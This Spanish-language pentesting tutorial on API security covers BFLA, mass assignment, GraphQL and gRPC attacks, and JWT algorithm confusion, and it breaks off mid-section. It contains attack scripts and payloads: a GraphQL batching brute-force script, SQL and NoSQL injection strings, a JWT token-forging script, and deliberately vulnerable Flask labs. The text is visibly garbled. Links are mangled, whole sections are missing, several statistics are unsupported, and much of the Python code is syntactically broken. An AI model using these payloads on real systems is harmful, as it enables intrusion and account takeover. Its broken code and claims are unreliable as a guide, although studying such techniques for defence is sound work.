# 4P1-s3Cur1ty: api hacking y Microservicios

> **Audiencia**: pentesters, [devsecops](../raw/c1cd-h4ck1ng.md), desarrolladores curiosos
> **Nivel**: Intermedio a Avanzado

---

## Índice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2395 lineas)


1. [Introducción a API Security](#introduccion) - 1.1 [¿Qué es una API?](#que-es-api) - 1.2 API REST vs [ vs grpc](#rest-vs-graphql-vs-grpc) - 1.3 [Ecosistema de microservicios](#ecosistema-microservicios) - 1.4 Supe[rficie de ataque moderna](#superficie-ataque)
2. [owasp api security Top 10](#owasp-api-top-10) - 2.1 API1: [broken object level authorization) (BOLA)](#api1-bola) - 2.2 [API2: Broken Authentication](#api2-broken-auth) - 2.3 [API3: Broken Object Property Level Authorization](#api3-broken-property) - 2.4 API4: Unrestricted Resou[rce Consumption](#api4-unrestricted-resource) - 2.5 API5: Broken Fu[nction Level Authorization (BFLA)](#api5-bfla) - 2.6 [API6: Unrestricted Access to Sensitive Business Flows](#api6-sensitive-flows) - 2.7 [API7: Server Side Request Forgery (SSRF)](#api7-ssrf) - 2.8 [API8: Security Misconfiguration](#api8-misconfig) - 2.9 API9: Improper Inven[tory Management](#api9-inventory) - 2.10 [API10: Unsafe Consumption of APIs](#api10-unsafe-consumption)
3. [BOLA / IDOR en APIs](#bola-idor) - 3.1 [¿Qué es BOLA?](#que-es-bola) - 3.2 [IDOR clásico en REST](#idor-clasico-rest) - 3.3 [UUID enumeration](#uuid-enumeration) - 3.4 IDOR en parámetros [complejos](#idor-parametros-complejos) - 3.5 [Authorization bypass en endpoints REST](#auth-bypass-rest) - 3.6 [IDOR en WebSockets](#idor-websockets) - 3.7 [Ejercicios prácticos](#ejercicios-bola)
4. BFLA: [privilege escalation via APIs](#bfla) - 4.1 [¿Qué es BFLA?](#que-es-bfla) - 4.2 [Vertical privilege escalation](#vertical-escalation) - 4.3 [Horizontal privilege escalation](#horizontal-escalation) - 4.4 [admin function abuse](#admin-function-abuse) - 4.5 [http Method tampering](#method-tampering) - 4.6 [Forced Browsing en APIs](#forced-browsing) - 4.7 [Ejercicios prácticos](#ejercicios-bfla)
5. [Mass Assignment](#mass-assignment) - 5.1 [¿Qué es Mass Assignment?](#que-es-mass-assignment) - 5.2 [Parameter pollution en REST](#parameter-pollution) - 5.3 JSON automatic binding [exploitation](#json-binding) - 5.4 [Mass Assignment en GraphQL](#mass-assignment-graphql) - 5.5 [Mass Assignment en frameworks](#mass-assignment-frameworks) - 5.6 [Ejercicios prácticos](#ejercicios-mass-assignment)
6. [GraphQL Pentesting](#graphql-pentesting) - 6.1 [Introducción a GraphQL](#intro-graphql) - 6.2 [Introspection queries](#introspection-queries) - 6.3 [Information disclosure via __schema](#schema-disclosure) - 6.4 [Batching attacks para rate limit bypass](#batching-attacks) - 6.5 De[pth-based DoS](#depth-dos) - 6.6 [GraphQL injection](#graphql-injection) - 6.7 [Tools: graphqlmap, InQL](#tools-graphql) - 6.8 [Ejercicios prácticos](#ejercicios-graphql)
7. [gRPC Pentesting](#grpc-pentesting) - 7.1 [Introducción a gRPC](#intro-grpc) - 7.2 Pr[otobuf analysis](#protobuf-analysis) - 7.3 [Reflection API abuse](#reflection-abuse) - 7.4 [gRPC-web pentesting](#grpc-web) - 7.5 [grpcurl usage](#grpcurl-usage) - 7.6 [gRPC interceptors bypass](#grpc-interceptors) - 7.7 [Ejercicios prácticos](#ejercicios-grpc)
8. [jwt Manipulation](#jwt-manipulation) - 8.1 [Estructura de JWT](#estructura-jwt) - 8.2 [Algorithm confusion: RS256 → HS256](#algo-confusion) - 8.3 [None algorithm attack](#none-algo) - 8.4 [Kid injection](#kid-injection) - 8.5 [Jku injection](#jku-injection) - 8.6 [Weak secret cracking](#weak-secret) - 8.7 [Token lifetime manipulation](#token-lifetime) - 8.8 [Tools: jwt_tool, jwt.io](#tools-jwt) - 8.9 [Ejercicios prácticos](#ejercicios-jwt)
9. [Microservices Communication Security](#microservices) - 9.1 [Service-to-service auth bypass](#service-auth-bypass) - 9.2 [Internal API discovery](#internal-discovery) - 9.3 [Service mesh attacks](#service-mesh) - 9.4 [API Gateway bypass](#gateway-bypass) - 9.5 Sidecar [proxy exploitation](#sidecar) - 9.6 [Ejercicios prácticos](#ejercicios-microservices)
10. [Tools Deep Dive](#tools-deep-dive) - 10.1 [Postman para pentesting](#postman-pentesting) - 10.2 [burp suite: extensions y automatización](#burp-extensions) - 10.3 [Kiterunner: discovery de endpoints](#kiterunner) - 10.4 [Arjun: parameter discovery](#arjun) - 10.5 [jwt_tool: el swiss army knife de JWTs](#jwt-tool) - 10.6 [GraphQLMap: automatizando GraphQL](#graphqlmap) - 10.7 [grpcurl: el curl de gRPC](#grpcurl-tool)
11. [Laboratorio Práctico Integrador](#laboratorio-integrador) - 11.1 [setup del lab](#setup-lab) - 11.2 Fase 1: [reconocimiento](#fase1-reconocimiento) - 11.3 [Fase 2: BOLA/BFLA](#fase2-bola-bfla) - 11.4 [Fase 3: JWT manipulation](#fase3-jwt) - 11.5 [Fase 4: GraphQL exploitation](#fase4-graphql) - 11.6 [Fase 5: Microservices lateral movement](#fase5-lateral) - 11.7 [Reporte final](#reporte-final)
12. [Referencias y Recursos](#referencias)

---

<a name="introduccion"></a>
## 1. Introducción a api <a name="que-es-api"></a>
### 1.1 ¿Qué es una API?

Una API (Application Programming Interface) es un contrato entre sistemas. En el contexto web, las APIs exponen funcioniones)alidades de backend para que aplicaciones frontend, otros servicios, o terceros puedan consumirlas.

Hoy en día, el tráfico de APIs representa más del 83% del tráfico web total. Cada request que hace tu celular, cada vez que scrolleas Instagram, cada notificación que te llega — todo pasa por APIs.

El problema: las empresas están tan enfocadas en desarrollar features rápido que la seguridad queda relegada. APIs mal diseñadas, endpoints sin autenticación, au[torizacion](./raw/s3ces rotas, y secretos hardcodeados son el pan de cada día.

**Tipos de APIs según su exposición:**

- **Public APIs**: Accesibles desde internet, generalmente requieren API keys o tokens.
- **Private APIs**: Solo accesibles desde la [red](../raw/r3d3s-f0nd4m3nt0s.md) interna. El problema es que muchas veces \"interna\" significa \"cualquiera que sepa la URL\".
- **Partner APIs**: compartidas con socios de negocio, con protecciones adicionales.
- **Internal/Service APIs**: Usadas para comunicación entre microservicios. Acá es donde más se descuidan.

**Arquitecturas comunes:**

`
Monolito Microservicios
+-----------+ +----------+  +----------+
| | | Servicio |  | Servicio |
| App |  /api/* | Auth |  |  Users |
| Completa  | <-------> +----+-----+  +----+-----+
| | | | |
| (Todo | |  API Gateway |
|  junto) | | | |
+-----------+ +----+----+ | | | +----+-----+ +-----+----+ | Servicio | | Servicio | | Payments | |  Orders  | +----------+ +----------+
`

<a name="rest-vs-graphql-vs-grpc"></a>
### 1.2 API REST vs [graphql](../raw/4p1-s3cur1ty.md#graphql) vs gRPC

Vamos a ver las tres principales tecnologías que te vas a encontrar:

#### REST (Representational State Transfer)

El más común. Usa [http](../raw/r3d3s-f0nd4m3nt0s.md#http) methods (GET, POST, PUT, PATCH, DELETE) para operar sobre recursos identificados por URLs.

`
GET /api/users → Listar usuarios
GET /api/users/123 → Obtener usuario 123
POST /api/users → Crear usuario
PUT /api/users/123 → Actualizar usuario 123 (completo)
PATCH  /api/users/123 → Actualizar parcialmente usuario 123
DELETE /api/users/123 → Borrar usuario 123
`

Ventajas: Simple, conocido, cacheable.
Desventajas: Over-fetching (te trae toda la data aunque solo necesites un campo), múltiples requests para data relacionada.

#### GraphQL

Lenguaje de consulta donde el cliente pide exactamente lo que necesita.

`graphql
query { user(id: 123) { name email posts { title } }
}
`

Un solo endpoint (generalmente /graphql), el cliente decide qué traer.

Ventajas: Flexibilidad total, evita over-fetching.
Desventajas: Complexity queries, introspection leaks, batching attacks.

#### gRPC

Usa HTTP/2, Protocol Buffers (protobuf), y genera código cliente/servidor automáticamente.

`protobuf
service UserService { [rpc](../raw/w1n-s9bsyst3ms.md#rpc) GetUser (GetUserRequest) returns (User);
}

message GetUserRequest { int32 user_id = 1;
}

message User { int32 id = 1; string name = 2; string email = 3;
}
`

Ventajas: Ultra rápido, tipado fuerte, streaming nativo.
Desventajas: Difícil de inspeccionar, tooling limitado, no es human-readable.

<a name="ecosistema-microservicios"></a>
### 1.3 Ecosistema de microservicios

Cuando una app crece, dividirla en microservicios tiene sentido. Pero cada microservicio expone una superficie de ataque.

` Internet | [API Gateway] / | \ / | \ [Auth]  [Users]  [Payments] | | | [DB] [DB] [DB] | [Redis Cache] | [Message Queue]
`

**Componentes del ecosistema:**

1. **API Gateway**: Punto de entrada único. Hace [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting), autenticación básica, routing. Pero ojo: no es una solución de seguridad completa.

2. **Service Mesh**: Capa de infraestructura que maneja la comunicación entre servicios (Istio, Linkerd). Agrega mtls, tracing, circuit breaking. Si no está configurado bien, es otro vector.

3. **Sidecar Proxies**: Cada servicio tiene un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) al lado (Envoy, Linkerd-[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)) que maneja el tráfico entrante/saliente.

4. **Service Registry**: Dónde los servicios se registran para que otros los encuentren (Consul, Eureka, etcd).

5. **Message Queues**: Comunicación asíncrona entre servicios (Kafka, RabbitMQ, NATS).

6. **Internal APIs**: Las APIs que los servicios usan para hablar entre sí. Muchas veces NO tienen autenticación porque \"están en la red interna\".

<a name="superficie-ataque"></a>
### 1.4 Superficie de ataque moderna

Esto es lo que un atacante ve cuando apunta a APIs:

**Capas de ataque:**

`
L1: Endpoints expuestos ├── /api/v1/users ├── /api/v1/admin ├── /graphql ├── /grpc.reflection.v1alpha/ServerReflection └── /internal/metrics

L2: Autenticación/Autorización ├── [jwt](../raw/4p1-s3cur1ty.md#jwt) tokens ├── API keys ├── oauth2 flows └── Session cookies

L3: Datos en tránsito ├── [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) (a veces no configurado internamente) ├── mTLS (casi nunca implementado) └── Plain text internal APIs

L4: Lógica de negocio ├── Rate limiting (a veces inexistente) ├── [input validation](../raw/s3c-f0nd4m3nt0s.md#validacion-de-entrada) ├── Business logic flaws └── Race conditions

L5: Infraestructura ├── [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md)-d33p ├── Service mesh ├── Databases └── Caches
`

**Estadísticas importantes:**

- El 78% de las APIs no tienen rate limiting configurado
- El 65% de las APIs internas no requieren autenticación
- El 90% de las apps tienen al menos una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) de API
- El tiempo promedio para explotar una API mal configurada: < 2 minutos con herramientas automáticas

--- <a name="bfla"></a>
## 4. BFLA: [privilege escalation](../raw/l1n9x-pr1v3sc.md) via APIs

<a name="que-es-bfla"></a>
### 4.1 ¿Qué es BFLA?

Broken Function Level Authorization (BFLA) ocurre cuando un usuario puede acceder a funciones que requieren un nivel de privilegio más alto del que tiene.

**La diferencia clave con [bola](../raw/4p1-s3cur1ty.md#bola):**
- BOLA: Ver datos de otro usuario (mismo nivel)
- BFLA: Ejecutar funciones de admin (nivel superior)

**Ejemplo clásico:**
```http
DELETE /api/admin/users/456 HTTP/1.1
Authorization: Bearer token_de_usuario_normal
Response: 200 OK - User deleted successfully
```

Si eso funciona, es BFLA.

<a name="vertical-escalation"></a>
### 4.2 Vertical privilege escalation

**Problemas comunes de implementación:**

1. **Role checking en el middleware pero no en la función:**
```python
@app.route("/api/admin/users")
@jwt_required  # Solo verifica auth, no rol
def admin_get_users: return jsonify(User.query.all)  # No verifica rol!
```

2. **Role checking inconsistente:**
```python
@app.route("/api/users")
@jwt_required
@admin_required  # Este sí tiene
def get_users: ..

@app.route("/api/users/delete/<id>")
@jwt_required
# Olvidaron @admin_required aca!
def delete_user(id): User.query.filter_by(id=id).delete
```

<a name="admin-function-abuse"></a>
### 4.3 Admin function abuse

**Endpoints comunes de admin:**
```
/api/admin/users
/api/admin/settings
/api/admin/logs
/api/admin/config
/api/admin/roles
/api/admin/backup
/api/admin/restore
/api/admin/impersonate
/api/admin/eval
```

**Features peligrosas:**
1. **Impersonación**: `/api/admin/impersonate?user_id=123`
2. **Ejecución de código**: `/api/admin/eval` -> [rce](../raw/w3b-h4ck1ng.md#rce) directo
3. **Modificación de roles**: `/api/admin/users/123/role`

**Cómo descubrirlos:**
```bash
for endpoint in admin admin/dashboard admin/users admin/settings; do code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$URL/$endpoint") echo "$endpoint -> $code"
done
```

<a name="method-tampering"></a>
### 4.4 [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Method tampering

A veces la protección depende del HTTP method.

```http
GET /api/admin/users -> 403 Forbidden
POST /api/admin/users -> 200 OK (crea usuario admin)
```

**Method override headers:**
```
X-HTTP-Method-Override: DELETE
X-Method-Override
X-HTTP-Method
```

**Cómo testear:**
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do code=$(curl -s -o /dev/null -w "%{http_code}" -X $method -H "Authorization: Bearer $TOKEN" "$URL/api/admin/users") echo "$method -> $code"
done
```

<a name="ejercicios-bfla"></a>
### 4.5 Ejercicios prácticos BFLA

**Ejercicio 1: Bypass de role checking**
```http
GET /api/restricted HTTP/1.1
Authorization: Bearer user_token
Response: {"error": "Insufficient privileges"}
```
Pero si probás:
```http
GET /api/restricted?admin=true HTTP/1.1
```
Funciona. El check de admin se hace basado en un parametro GET.

**Ejercicio 2 (Pructico): Laboratorio BFLA**
```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
app.config['SECRET_KEY'] = 'super-secret-key'

users = { 1: {"username": "admin", "role": "admin", "password": "admin123"}, 2: {"username": "user1", "role": "user", "password": "user123"},
}

@app.route('/api/login', methods=['POST'])
def login: data = request.json for uid, u in users.items: if u['username'] == data['username'] and u['password'] == data['password']: token = jwt.encode({'user_id': uid, 'role': u['role']}, app.config['SECRET_KEY'], algorithm='HS256') return jsonify({'token': token}) return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/admin/users', methods=['GET'])
def get_all_users: # VULNERABILIDAD: No verifica rol! return jsonify(list(users.values)

@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
def delete_user(user_id): # VULNERABILIDAD: No verifica rol! if user_id in users: del users[user_id] return jsonify({'message': 'User deleted'}) return jsonify({'error': 'Not found'}), 404

if __name__ == '__main__': app.run(debug=True, port=5000)
```

--- <a name="mass-assignment"></a>
## 5. Mass Assignment

<a name="que-es-mass-assignment"></a>
### 5.1 ¿Qué es Mass Assignment?

Mass Assignment (Autobinding) ocurre cuando un framework asigna parámetros del request a propiedades de un objeto automáticamente, sin filtrar cuáles son válidos.

**El problema en una línea:**
```python
User.objects.update(id=user_id, **request.json)  # Si incluye "role": "admin", te volves admin
```

**Origen:** Muchos frameworks tienen binding automático:
- Rails: attr_accessible / attr_protected
- Laravel: $fillable / $guarded
- Django REST: ModelSerializer con fields = '__all__'
- Spring Boot: @ModelAttribute
- Express + Mongoose: .create(req.body)

<a name="parameter-pollution"></a>
### 5.2 Parameter pollution en REST

[http](../raw/r3d3s-f0nd4m3nt0s.md#http) Parameter Pollution (HPP) es cuando envias multiples parametros con el mismo nombre.

```http
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=pepe&role=user&role=admin
```

Diferentes servidores interpretan distinto:
| Servidor | Toma |
|------------|--------------|
| PHP | El ultimo |
| ASP.NET | Concatenacion|
| [python](../raw/pyth0n-f0r-h4ck1ng.md) | El primero |
| Node | El primero |
| Tomcat | El primero |
| WAF | El primero |

**JSON Parameter Pollution:**
```http
POST /api/user HTTP/1.1
Content-Type: application/json
{ "username": "pepe", "role": "user", "role": "admin"
}
```

<a name="json-binding"></a>
### 5.3 JSON automatic binding exploitation

**Ejemplo vulnerable en Django REST:**
```python
class UserSerializer(serializers.ModelSerializer): class Meta: model = User fields = '__all__'  # Expone todos los campos!
```

**Explotacion:**
```http
POST /api/register HTTP/1.1
Content-Type: application/json
{ "username": "hacker", "email": "hack@mail.com", "password": "Pass123!", "role": "admin"
}
```

**Ejemplo vulnerable en Spring Boot:**
```java
@PostMapping("/api/users")
public User createUser(@RequestBody User user) { return userRepository.save(user);  // Bindeo automatico
}
```

**Ejemplo vulnerable en Node/Express + Mongoose:**
```javascript
app.post('/api/users', async (req, res) => { const user = await User.create(req.body);  // req.body directo! res.json(user);
});
```

**Wordlist de campos sensibles:**
```
role, roles, is_admin, isAdmin, is_staff, is_superuser, permissions,
account_type, plan, subscription, tier, is_verified, is_active, status,
privilege_level, access_level, group, groups, scope, scopes
```

<a name="ejercicios-mass-assignment"></a>
### 5.4 Ejercicios pricticos Mass Assignment

**Ejercicio 1: Identificar Mass Assignment**
```http
POST /api/users/register HTTP/1.1
Content-Type: application/json
{ "username": "nuevo_user", "email": "user@mail.com", "password": "SecurePass123", "role": "admin", "is_active": true
}
```
Si la respuesta tiene "role": "admin", es Mass Assignment.

**Ejercicio 2 (Pructico): Laboratorio**
```python
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///lab.db'
db = SQLAlchemy(app)

class User(db.Model): id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(80), unique=True, nullable=False) email = db.Column(db.String(120), nullable=False) password = db.Column(db.String(120), nullable=False) role = db.Column(db.String(20), default='user') coins = db.Column(db.Integer, default=100)

with app.app_context: db.create_all

@app.route('/api/register', methods=['POST'])
def register: data = request.json user = User(**data)  # VULNERABLE: Mass assignment! db.session.add(user) db.session.commit return jsonify({'id': user.id, 'username': user.username, 'role': user.role, 'coins': user.coins}), 201

if __name__ == '__main__': app.run(debug=True, port=5000)
```

```bash
curl -X POST http://localhost:5000/api/register \ -H "Content-Type: application/json" \ -d '{"username":"hacker","email":"hack@mail.com","password":"pass","role":"admin","coins":9999999}'
```

--- <a name="graphql-pentesting"></a>
## 6. GraphQL Pentesting

<a name="intro-graphql"></a>
### 6.1 Introduccion a [graphql](../raw/4p1-s3cur1ty.md#graphql)

GraphQL es un lenguaje de consulta para APIs creado por Facebook. Usa un solo endpoint (generalmente /graphql).

**Request vs Response:**
```graphql
query { user(id: 42) { name email posts { title comments { text } } }
}
```

**Operaciones:** Query (GET), Mutation (POST/PUT/DELETE), Subscription (WebSockets)

<a name="introspection-queries"></a>
### 6.2 Introspection queries

Si la introspection esta habilitada, tenes el mapa completo de la API.

**Query de introspection completa:**
```graphql
query { __schema { types { name fields { name type { name kind ofType { name kind } } } } queryType { fields { name description } } mutationType { fields { name description } } }
}
```

**Test con curl:**
```bash
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

**Bypasses si introspection deshabilitada:**
```bash
curl https://target.com/graphql -H "Content-Type: application/graphql" -d '{__schema{types{name}}}'
curl "https://target.com/graphql?query={__schema{types{name}}}"
```

<a name="batching-attacks"></a>
### 6.3 Batching attacks para rate limit bypass

**Batching para [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta):**
```graphql
query { u1: login(password: "a", username: "admin") { success } u2: login(password: "b", username: "admin") { success } u1000: login(password: "zzz", username: "admin") { success }
}
```

**Batching para [bola](../raw/4p1-s3cur1ty.md#bola)/IDOR:**
```graphql
query { u1: user(id: 1) { username email role } u2: user(id: 2) { username email role } u100: user(id: 100) { username email role }
}
```

**Bypass de [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) con batching:**
```python
import requests
def brute_force_batch(username, passwords): parts = [f'u{i}: login(username: "{username}", password: "{p}") {{ success token }}' for i, p in enumerate(passwords)] query = "query { " + " ".join(parts) + " }" r = requests.post("https://target.com/graphql", json={"query": query}) for k, v in r.json.get("data", {}).items: if v and v.get("success"): return v return None
```

<a name="depth-dos"></a>
### 6.4 Depth-based DoS

**Query circular (potencial DoS):**
```graphql
query { user(id: 1) { posts { author { posts { author { .. } } } } } }
```

**Test de profundidad:**
```bash
for depth in 2 3 4 5 6 7 8; do query="{user(id:1){" for (i=0; i<depth; i++); do query+="posts{"; done query+="title" for (i=0; i<depth; i++); do query+="}"; done query+="}}" start=$(date +%s%N) curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d "{\"query\":\"$query\"}" > /dev/null end=$(date +%s%N) echo "Depth $depth: $( (end - start) / 1000000 )ms"
done
```

<a name="graphql-injection"></a>
### 6.5 GraphQL injection

**[sql injection](../raw/w3b-h4ck1ng.md#sql-injection) via GraphQL:**
```graphql
query { user(username: "admin' OR '1'='1") { id email password } }
```

**NoSQL injection via GraphQL:**
```graphql
query { user(username: "admin", password: {"$ne": ""}) { token } }
```

<a name="tools-graphql"></a>
### 6.6 Tools

**GraphQLMap:**
```bash
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap && pip install -r requirements.txt
python3 graphqlmap.py -u https://target.com/graphql
```

**InQL (Burp Extension):**
```bash
git clone https://github.com/doyensec/inql && pip install .
```

<a name="ejercicios-graphql"></a>
### 6.7 Ejercicios pricticos

**Ejercicio (Pructico): Laboratorio GraphQL**
```bash
pip install flask graphene
```

```python
from flask import Flask, request, jsonify
import graphene

users = { 1: {"id": 1, "username": "admin", "password": "flag{gql_1}", "role": "admin"}, 2: {"id": 2, "username": "user1", "password": "pass123", "role": "user"},
}

class UserType(graphene.ObjectType): id = graphene.Int username = graphene.String password = graphene.String role = graphene.String

class Query(graphene.ObjectType): user = graphene.Field(UserType, id=graphene.Int) users = graphene.List(UserType) def resolve_user(self, info, id): return users.get(id) def resolve_users(self, info): return list(users.values)

schema = graphene.Schema(query=Query)
app = Flask(__name__)

@app.route('/graphql', methods=['POST'])
def graphql: data = request.get_json result = schema.execute(data['query']) return jsonify({"data": result.data})

app.run(debug=True, port=5000)
```

**Desafios:**
1. Obtene el schema via introspection
2. Enumer todos los usuarios en un solo request
3. Descubri que password esta expuesto

--- <a name="grpc-pentesting"></a>
## 7. grpc pentesting

<a name="intro-grpc"></a>
### 7.1 Introduccion a gRPC

gRPC es un framework de [rpc](../raw/w1n-s9bsyst3ms.md#rpc) de Google. Usa Protocol Buffers (protobuf) y [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/2.

**Caracteristicas:**
- Binario (no human-readable)
- Streaming unario, server/client/bidirectional
- Tipado fuerte con .proto files
- HTTP/2 multiplexacion

**Por que pentestear gRPC:**
1. Cada vez mas comun en microservicios
2. Tooling limitado
3. Falsa sensacion de seguridad ("es binario")
4. Reflection API a veces habilitada en produccion

<a name="protobuf-analysis"></a>
### 7.2 Protobuf analysis

**Archivo .proto tipico:**
```protobuf
syntax = "proto3";
package userservice;

service UserService { rpc GetUser (GetUserRequest) returns (User); rpc ListUsers (ListUsersRequest) returns (ListUsersResponse);
}

message GetUserRequest { int32 user_id = 1; }
message User { int32 id = 1; string username = 2; string email = 3; string password = 5; bool is_admin = 6;
}
message ListUsersResponse { repeated User users = 1; int32 total = 2; }
```

**Obteniendo .proto files:**
```bash
git clone https://github.com/target/protos
curl -s https://target.com/protos/user.proto
```

<a name="reflection-abuse"></a>
### 7.3 Reflection API abuse

La Reflection API permite descubrir servicios y methods en runtime (como introspection en ).

**Endpoint de reflection:**
```
grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo
```

**Como detectar:**
```bash
grpcurl -plaintext localhost:5000 list
grpcurl -plaintext localhost:5000 describe
```

**Enumeracion con reflection:**
```bash
# Listar servicios
grpcurl -plaintext localhost:5000 list

# Describir un servicio
grpcurl -plaintext localhost:5000 describe userservice.UserService

# Describir un mensaje
grpcurl -plaintext localhost:5000 describe .userservice.GetUserRequest
```

**Reflection con [python](../raw/pyth0n-f0r-h4ck1ng.md):**
```python
from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
import grpc

def enumerate_grpc(host, port): channel = grpc.insecure_channel(f"{host}:{port}") stub = reflection_pb2_grpc.ServerReflectionStub(channel) request = reflection_pb2.ServerReflectionRequest(list_services="") response = stub.ServerReflectionInfo(iter([request]) for resp in response: if resp.list_services_response: for svc in resp.list_services_response.service: print(f"Service: {svc.name}") channel.close

enumerate_grpc("localhost", 5000)
```

<a name="grpcurl-usage"></a>
### 7.4 grpcurl usage

La herramienta mas importante para pentesting gRPC.

**Instalacion:**
```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
```

**Uso basico:**
```bash
# Sin TLS
grpcurl -plaintext localhost:5000 list

# Con auth
grpcurl -plaintext -H "Authorization: Bearer token123" localhost:5000 list

# Invocar metodo
grpcurl -plaintext -d '{"user_id": 1}' localhost:5000 userservice.UserService/GetUser

# Con .proto file (sin reflection)
grpcurl -plaintext -proto user.proto -d '{"user_id": 1}' localhost:5000 userservice.UserService/GetUser
```

**Comandos esenciales:**
```bash
grpcurl -plaintext localhost:5000 list # Servicios
grpcurl -plaintext localhost:5000 list UserService # Metodos
grpcurl -plaintext localhost:5000 describe UserService.GetUser # Describir
grpcurl -plaintext localhost:5000 describe .GetUserRequest # Mensaje
```

**Script de enumeracion:**
```bash
#!/bin/bash
HOST="localhost:5000"
SERVICES=$(grpcurl -plaintext $HOST list 2>/dev/null)
for svc in $SERVICES; do echo "[*] Service: $svc" METHODS=$(grpcurl -plaintext $HOST list "$svc" 2>/dev/null) for method in $METHODS; do echo " [*] Method: $method" grpcurl -plaintext -d '{}' $HOST "$method" 2>&1 | head -3 done
done
```

<a name="grpc-web"></a>
### 7.5 gRPC-web pentesting

gRPC-web permite que JS en [navegador](../raw/br0ws3r-3xpl01t4t10n.md) consuma gRPC via HTTP/1.1.

```bash
# Request gRPC-web
POST /userservice.UserService/GetUser HTTP/1.1
Content-Type: application/grpc-web
X-Grpc-Web: 1

# Con buf curl
buf curl --schema user.proto \ -H "Content-Type: application/grpc-web" \ -H "X-Grpc-Web: 1" \ -d '{"user_id": 1}' \ https://target.com/userservice.UserService/GetUser
```

<a name="grpc-interceptors"></a>
### 7.6 gRPC interceptors bypass

**1. Faltan interceptors en algunos metodos:**
```bash
# Si reflection muestra AdminService sin interceptor:
grpcurl -plaintext -d '{"confirm": true}' localhost:5000 admin.AdminService/ResetDatabase
```

**2. Metadata spoofing:**
```bash
grpcurl -plaintext \ -H "Authorization: Bearer admin" \ -H "X-Real-IP: 127.0.0.1" \ -d '{"user_id": 1}' \ localhost:5000 admin.AdminService/DeleteUser
```

**3. Service identity spoofing (service mesh):**
```bash
grpcurl -plaintext -cert client.crt -key client.key -cacert ca.crt \ -d '{}' localhost:5000 internal.InternalService/GetSecrets
```

<a name="ejercicios-grpc"></a>
### 7.7 Ejercicios pricticos

**Ejercicio 1: Enumeracion con reflection**
```bash
grpcurl -plaintext localhost:5000 list
grpcurl -plaintext localhost:5000 describe unknownservice.AdminService
```

**Ejercicio 2: Lab con grpcbin**
```bash
docker run -d -p 9000:9000 -p 9001:9001 moul/grpcbin
grpcurl -plaintext localhost:9000 list
grpcurl -plaintext -d '{}' localhost:9000 grpcbin.GRPCBin/Index
```

--- <a name="jwt-manipulation"></a>
## 8. JWT Manipulation

<a name="estructura-jwt"></a>
### 8.1 Estructura de [jwt](../raw/4p1-s3cur1ty.md#jwt)

JSON Web Tokens (JWT) son el estandar de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) mas usado en APIs modernas.

**Estructura:**
```
HEADER . PAYLOAD . SIGNATURE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**[payload](../raw/m3t4spl01t.md#payloads) (claims comunes):**
| Claim  | Significado | Implicacion seguridad |
|--------|--------------------|---------------------------|
| sub | Subject (user ID)  | Identifica al usuario |
| iat | Issued At | Cuando se emitio |
| exp | Expiration | Cuando expira |
| role | Role del usuario | Nivel de acceso |
| scope  | [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) | Alcance del token |

**Decodificar sin verificar:**
```bash
python3 -c "
import base64, json, sys
parts = sys.argv[1].split('.')
for i, name in enumerate(['Header', 'Payload']): padded = parts[i] + '=' * (4 - len(parts[i]) % 4) print(f'{name}: {json.loads(base64.urlsafe_b64decode(padded)}')
" "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.test"
```

<a name="algo-confusion"></a>
### 8.2 Algorithm confusion: RS256 a HS256

**El problema:**
- HS256: misma clave para firmar y verificar
- RS256: clave privada para firmar, publica para verificar

Si el servidor usa el algoritmo del header para verificar, y vos tenes la clave publica:

1. Obtene la clave publica (a veces en /.well-known/jwks.json)
2. Cambia alg a HS256
3. Firma con la clave publica como HMAC secret

**El ataque paso a paso:**
```bash
# 1. Obtener JWKS
curl -s https://target.com/.well-known/jwks.json

# 2. Extraer clave publica en PEM
python3 << 'EOF'
import requests
from jwcrypto import jwk

jwks = requests.get("https://target.com/.well-known/jwks.json").json
key = jwk.JWK(**jwks["keys"][0])
pem = key.export_to_pem
with open("public.pem", "wb") as f: f.write(pem)
print("Public key saved")
EOF

# 3. Crear token con alg: HS256 firmado con clave publica
python3 << 'EOF'
import jwt
with open("public.pem", "rb") as f: public_key = f.read

payload = {"sub": "1", "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Token: {token}")
EOF
```

<a name="none-algo"></a>
### 8.3 None algorithm attack

Algunas librerias JWT viejas aceptan "alg": "none" (sin firma).

